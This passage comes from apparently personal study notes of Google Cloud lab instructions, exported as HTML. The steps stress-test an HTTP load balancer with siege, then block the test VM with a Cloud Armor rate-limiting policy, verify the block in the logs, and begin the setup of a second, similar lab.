Balancer</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-4-test-the-http-load-balancer'><span>Task 4. Test the HTTP Load Balancer</span></h3><p><span>Now that you created the HTTP Load Balancer for your backends, verify that traffic is forwarded to the backend service.</span></p><p>&nbsp;</p><p><span>The HTTP load balancer should forward traffic to the region that is closest to you.</span></p><p>&nbsp;</p><p><span>True</span></p><p>&nbsp;</p><p><span>False</span></p><p>&nbsp;</p><h4 id='access-the-http-load-balancer'><span>Access the HTTP Load Balancer</span></h4><ul><li><p><span>To test IPv4 access to the HTTP Load Balancer, open a new tab in your browser and navigate to </span><code>http://[LB_IP_v4]</code><span>. Make sure to replace </span><code>[LB_IP_v4]</code><span> with the IPv4 address of the load balancer.</span></p></li></ul><p><strong><span>Note:</span></strong><span> It might take up to 5 minutes to access the HTTP Load Balancer. In the meantime, you might get a 404 or 502 error. Keep trying until you see the page of one of the backends.</span></p><p><strong><span>Note:</span></strong><span> Depending on your proximity to </span><strong><code>us-east4</code></strong><span> and </span><strong><code>europe-west1</code></strong><span>, your traffic is either forwarded to a </span><strong><code>us-east4</code><span>-mig</span></strong><span> or </span><strong><code>europe-west1</code><span>-mig</span></strong><span> instance.</span></p><p><span>If you have a local IPv6 address, try the IPv6 address of the HTTP Load Balancer by navigating to </span><code>http://[LB_IP_v6]</code><span>. Make sure to replace </span><code>[LB_IP_v6]</code><span> with the IPv6 address of the load balancer.</span></p><h4 id='stress-test-the-http-load-balancer'><span>Stress test the HTTP Load Balancer</span></h4><p><span>Create a new VM to simulate a load on the HTTP Load Balancer using </span><code>siege</code><span>. Then, determine if traffic is balanced across both backends when the load is high.</span></p><ol start='' ><li><p><span>In the Console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create instance</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>siege-vm</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>us-central1</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>us-central1-b</code></td></tr><tr><td style='text-align:left;' ><span>Series</span></td><td style='text-align:left;' ><span>E2</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> Given that </span><strong><code>us-central1</code></strong><span> is closer to </span><strong><code>us-east4</code></strong><span> than to </span><strong><code>europe-west1</code></strong><span>, traffic should be forwarded only to </span><strong><code>us-east4</code><span>-mig</span></strong><span> (unless the load is too high).</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the </span><strong><span>siege-vm</span></strong><span> instance to be created.</span></p></li><li><p><span>For </span><strong><span>siege-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>Run the following command, to install siege:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get -y install siege</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Test the HTTP Load Balancer</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>To store the IPv4 address of the HTTP Load Balancer in an environment variable, run the following command, replacing </span><code>[LB_IP_v4]</code><span> with the IPv4 address:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export LB_IP=[LB_IP_v4]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To simulate a load, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">siege -c 250 http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">New configuration template added to /home/cloudcurriculumdeveloper/.siege</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Run siege -C to view the current settings in that file</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>In the Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Network Services &gt; Load balancing</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Backends</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>http-backend</span></strong><span>.</span></p></li><li><p><span>Navigate to </span><code>http-lb</code><span>.</span></p></li><li><p><span>Click on the </span><strong><span>Monitoring</span></strong><span> tab.</span></p></li><li><p><span>Monitor the </span><strong><span>Frontend Location (Total inbound traffic)</span></strong><span> between North America and the two backends for 2 to 3 minutes.</span></p></li></ol><p><span>At first, traffic should just be directed to </span><strong><code>us-east4</code><span>-mig</span></strong><span> but as the RPS increases, traffic is also directed to </span><strong><code>europe-west1</code><span>-mig</span></strong><span>.</span></p><p><img src="images\CgaFQi0mn2Z4HMrK%2BCXyhmAGrlKunLMBNpXKrHaYPhs%3D" referrerpolicy="no-referrer" alt="Monitoring graph"></p><p><span>This demonstrates that by default traffic is forwarded to the closest backend but if the load is very high, traffic can be distributed across the backends.</span></p><ol start='' ><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of </span><strong><span>siege-vm</span></strong><span>.</span></p></li><li><p><span>Press CTRL+C to stop the siege.</span></p></li></ol><h3 id='task-5-create-cloud-armor-rate-limiting-policy'><span>Task 5. Create Cloud Armor rate limiting policy</span></h3><p><span>In this section you will use Cloud Armor to denylist the </span><strong><span>siege-vm</span></strong><span> from accessing the HTTP Load Balancer by setting a rate limiting policy.</span></p><ol start='' ><li><p><span>In Cloud Shell, create security policy via gcloud:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies create rate-limit-siege \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "policy for rate limiting"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Next, add a rate limiting rule:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud beta compute security-policies rules create 100 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy=rate-limit-siege &nbsp; &nbsp; \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --expression="true" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action=rate-based-ban &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --rate-limit-threshold-count=50 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --rate-limit-threshold-interval-sec=120 &nbsp; \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --ban-duration-sec=300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --conform-action=allow &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --exceed-action=deny-404 &nbsp; &nbsp; &nbsp; &nbsp; \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --enforce-on-key=IP</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Attach the security policy to the backend service http-backend:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute backend-services update http-backend \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy rate-limit-siege --global</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the Console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor</span></strong><span>.</span></p></li><li><p><span>Click </span><code>rate-limit-siege</code><span>. Your policy should resemble the following:</span></p></li></ol><p><img src="C:\Users\sherwinowen\Documents\my_tutorials\gcp\professional_cloud_architect\images\HtTzcdhWHT6ScuCL5MyKkBFXJyUjKcq92aUzLSxdz1U%3D.png" referrerpolicy="no-referrer" alt="rate-limit-security-policy page"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create Cloud Armor Rate Limiting Policy</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-6-verify-the-security-policy'><span>Task 6. Verify the security policy</span></h3><ol start='' ><li><p><span>Return to the SSH terminal of siege-vm.</span></p></li><li><p><span>Run a curl against the LB IP to verify you can still connect to it, should receive a 200 response:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the SSH terminal of siege-vm, to simulate a load, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">siege -c 250 http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The command will not generate any output.</span></p><ol start='' ><li><p><span>Explore the security policy logs to determine if this traffic is also blocked.</span></p></li><li><p><span>In the Console, navigate to </span><strong><span>Navigation menu &gt; Network Security &gt; Cloud Armor policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>rate-limit-siege</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Logs</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>View policy logs</span></strong><span>.</span></p></li><li><p><span>On the Logging page, make sure to clear all the text in the Query preview.</span></p></li><li><p><span>Select resource to </span><strong><span>Application Load Balancer &gt; http-lb-forwarding-rule &gt; http-lb</span></strong><span> then click </span><strong><span>Apply</span></strong><span>.</span></p></li><li><p><span>Now click </span><strong><span>Run Query</span></strong><span>.</span></p></li><li><p><span>Expand a log entry in Query results.</span></p><p><img src="images\SdiXJXvrIjBZPJZMSd9Y2ZhRbokm2bwRoEH3I01TZdE%3D" referrerpolicy="no-referrer" alt="Query results page"></p></li><li><p><span>Expand </span><strong><span>httpRequest</span></strong><span>.</span></p></li></ol><p><span>The request should be from the </span><strong><span>siege-vm</span></strong><span> IP address. If not, expand another log entry.</span></p><ol start='' ><li><p><span>Expand </span><code>jsonPayload</code><span>.</span></p></li><li><p><span>Expand </span><code>enforcedSecurityPolicy</code><span>.</span></p><p><img src="images\6Tg8NeDNW1atHww0aGfo4j90xzYQxpmuPovo11xb9Co%3D" referrerpolicy="no-referrer" alt="Query results page"></p></li></ol><p><span>Notice that the </span><code>configuredAction</code><span> is to </span><strong><span>DENY</span></strong><span> with the name </span><strong><span>rate-limit-siege</span></strong><span>.</span></p><p><strong><span>Note:</span></strong><span> Cloud Armor security policies create logs that can be explored to determine when traffic is denied and when it is allowed, along with the source of the traffic.</span></p><h3 id='congratulations-22'><span>Congratulations!</span></h3><p><span>You configured an HTTP Load Balancer with backends in </span><code>us-east4</code><span> and </span><code>europe-west1</code><span>. Then, you stress tested the Load Balancer with a VM and denylisted the IP address via rate limiting with Cloud Armor. You were able to explore the security policy logs to identify why the traffic was blocked.</span></p><p>&nbsp;</p><h2 id='lab---application-load-balancer-with-cloud-armor'><span>LAB - Application Load Balancer with Cloud Armor</span></h2><h3 id='overview-26'><span>Overview</span></h3><p><span>Google Cloud Application Load Balancing is implemented at the edge of Google&#39;s network in Google&#39;s points of presence (POP) around the world. User traffic directed to an Application Load Balancer enters the POP closest to the user and is then load balanced over Google&#39;s global network to the closest backend that has sufficient capacity available.</span></p><p><span>Cloud Armor IP allowlist/denylist enable you to restrict or allow access to your Application Load Balancer at the edge of the Google Cloud, as close as possible to the user and to malicious traffic. This prevents malicious users or traffic from consuming resources or entering your Virtual Private Cloud (VPC) networks.</span></p><p><span>In this lab, you configure an Application Load Balancer with global backends, as shown in the diagram below. Then, you stress test the Load Balancer and denylist the stress test IP with Cloud Armor.</span></p><p><img src="images\7wJtCqbfTFLwKCpOMzUSyPjVKBjUouWHbduOqMpfRiM%3D" referrerpolicy="no-referrer" alt="Network diagram that illustrates load balancing"></p><h4 id='objectives-21'><span>Objectives</span></h4><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Create HTTP and health check firewall rules</span></p></li><li><p><span>Configure two instance templates</span></p></li><li><p><span>Create two managed instance groups</span></p></li><li><p><span>Configure an Application Load Balancer with IPv4 and IPv6</span></p></li><li><p><span>Stress test an Application Load Balancer</span></p></li><li><p><span>Denylist an IP address to restrict access to an Application Load Balancer</span></p></li></ul><h3 id='setup-and-requirements-23'><span>Setup and requirements</span></h3><h4 id='before-you-click-the-start-lab-button-9'><span>Before you click the Start Lab button</span></h4><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h4 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-5'><span>How to start your lab and sign in to the Google Cloud console</span></h4><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 